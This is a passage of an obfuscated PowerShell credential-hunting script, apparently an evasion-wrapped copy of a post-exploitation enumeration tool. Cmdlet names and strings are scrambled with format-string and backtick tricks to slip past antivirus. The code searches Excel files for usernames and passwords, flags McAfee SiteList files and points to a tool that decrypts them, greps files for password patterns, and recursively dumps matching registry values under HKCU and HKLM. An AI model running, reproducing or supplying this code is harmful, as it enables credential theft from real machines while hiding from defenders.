    elseif (${P`AtH}.FullName | &("{0}{3}{1}{2}" -f'Sele','St','ring','ct-') ((("{1}{2}{0}" -f'0}.xls','.','*{'))-F  [chAr]92),((("{2}{0}{1}{3}"-f '0','}.','.*{','xlsm'))  -f[cHaR]92),((("{1}{0}"-f'x.xlsx','.*rs'))-crePlacE  'rsx',[Char]92)) {
      if (${rEad`e`xcEl} -and ${E`xCEl}) {
        &("{1}{0}{2}"-f 'arch-Ex','Se','cel') -Source ${P`ATh}.FullName -SearchText ("{0}{1}"-f'use','r')
        &("{1}{0}{3}{2}" -f 'h','Searc','Excel','-') -Source ${P`Ath}.FullName -SearchText ("{0}{1}"-f 'pas','s')
      }
    }
    else {
      if (${P`ATh}.Length -gt 0) {
        
      }
      if (${P`AtH}.FullName | &("{0}{2}{1}"-f'Select-S','ring','t') ((("{0}{2}{4}{3}{1}" -f'(?i','Ukp.xml',').*Sit','st','eLi'))  -REPlACe'Ukp',[CHAR]92)) {
        &("{1}{0}{2}"-f 'e-Ho','Writ','st') "Possible MCaffee Site List Found: $($_.FullName) "
        &("{2}{1}{0}" -f 'e-Host','rit','W') ("{7}{9}{1}{3}{8}{5}{14}{6}{0}{10}{4}{13}{2}{12}{11}" -f'ub','st going t','e-sitel','o leav','om/funoveri','is','https://gith','J','e th','u','.c','d-decryption','ist-pw','p/mcafe',' here: ') -ForegroundColor ("{1}{0}"-f'ow','Yell')
      }
      ${R`egExseAR`ch}.keys | &("{2}{1}{3}{0}" -f 'ject','Ea','For','ch-Ob') {
        ${P`ASS`w`ORDfOu`ND} = &("{0}{2}{1}" -f 'Ge','nt','t-Conte') ${p`ATH}.FullName -ErrorAction ("{2}{4}{1}{3}{0}" -f 'nue','o','Silent','nti','lyC') -Force | &("{0}{1}{2}" -f 'S','e','lect-String') ${ReGEX`Sea`R`ch}[${_}] -Context 1, 1
        if (${pAs`Sw`oRDFO`Und}) {
          &("{2}{0}{1}" -f 'ite-H','ost','Wr') ('Po'+'ssible'+' '+'Pa'+'ss'+'word '+'fo'+'und: '+"$_") -ForegroundColor ("{0}{1}{2}"-f 'Y','el','low')
          &("{2}{1}{0}" -f 'ost','rite-H','W') ${p`ATh}.FullName
          &("{2}{1}{0}" -f 'st','Ho','Write-') -ForegroundColor ("{1}{0}"-f 'lue','B') ("$_ "+'trig'+'gere'+'d')
          &("{3}{2}{1}{0}"-f't','Hos','rite-','W') ${P`Ass`WorDfoUnD} -ForegroundColor ("{1}{0}" -f 'ed','R')
        }
      }
    }  
  }
}



&("{1}{2}{0}" -f 't','Writ','e-Hos') -ForegroundColor ("{1}{0}"-f 'lue','B') ((("{7}{3}{4}{2}{6}{11}{8}{10}{0}{9}{5}{1}"-f 'gistry','k','====','=','=','rd Chec','={','==','0} ',' Passwo','Re','0}{'))  -f[cHar]124)

&("{0}{1}{2}"-f'Write-Ho','s','t') ((("{11}{3}{9}{4}{10}{5}{8}{7}{6}{0}{2}{1}"-f't','pepsi?',' you have a ','hi','i','l take so','Won9JA',' ','me time.','s w','l','T')) -repLACe([Char]57+[Char]74+[Char]65),[Char]39)
${r`E`GpAth} = @(((("{4}{8}{3}{7}{5}{1}{6}{0}{2}"-f'RENT_USER','CU','wsM','::wsMH','regi','EY_','R','K','stry')) -CREPlace([cHar]119+[cHar]115+[cHar]77),[cHar]92), ((("{6}{1}{0}{5}{7}{3}{2}{4}" -f'ry::{0}HK','gist','_M','LOCAL','ACHINE{0}','E','re','Y_'))  -f [ChaR]92))

foreach (${R} in ${regPA`Th}) {
(&("{1}{0}{2}"-f'ld','Get-Chi','Item') -Path ${r} -Recurse -Force -ErrorAction ("{0}{4}{2}{1}{3}" -f'Sil','yConti','ntl','nue','e')) | &("{0}{2}{3}{1}"-f'For','ect','Each-Ob','j') {
    ${P`Rope`RTY} = ${_}.property
    ${Na`Me} = ${_}.Name
    ${p`ROpEr`Ty} | &("{2}{3}{0}{4}{1}" -f'ach','bject','F','orE','-O') {
      ${pR`OP} = ${_}
      ${Reg`eXs`earCh}.keys | &("{0}{3}{1}{2}" -f 'F','j','ect','orEach-Ob') {
        ${v`AlUe} = ${REG`eXSE`A`RcH}[${_}]
        if (${p`ROp} | &("{0}{2}{1}{3}"-f'Where-Ob','e','j','ct') { ${_} -like ${VA`lUe} }) {
          &("{1}{3}{0}{2}"-f 'H','Wr','ost','ite-') ('Pos'+'si'+'ble'+' '+'Pa'+'ssw'+'ord '+'Found'+': '+"$Name\$Prop")
          &("{2}{0}{1}"-f 'ite-Hos','t','Wr') ('K'+'ey: '+"$_") -ForegroundColor ("{0}{1}" -f'R','ed')
        }
        ${pR`oP} | &("{4}{0}{2}{1}{3}" -f 'Each','b','-O','ject','For') {   
          ${PrOP`Va`LUE} = (&("{0}{2}{1}{3}" -f 'Get-Item','rop','P','erty') "registry::$Name").${_}
          if (${P`ROpV`AluE} | &("{2}{0}{1}"-f 're-Obje','ct','Whe') { ${_} -like ${vaL`Ue} }) {
            &("{1}{0}{2}" -f 'rit','W','e-Host') ('P'+'ossible'+' '+'Passwo'+'r'+'d '+'Fou'+'nd: '+"$name\$_ "+"$propValue")
          }
        }
      }
    }
  }
  if (${TiMe`S`TAMP}) { &("{0}{2}{1}" -f 'TimeE','psed','la') }
  &("{0}{2}{1}{3}" -f'W','te-Hos','ri','t') ('Fini'+'she'+'d '+"$r")
}
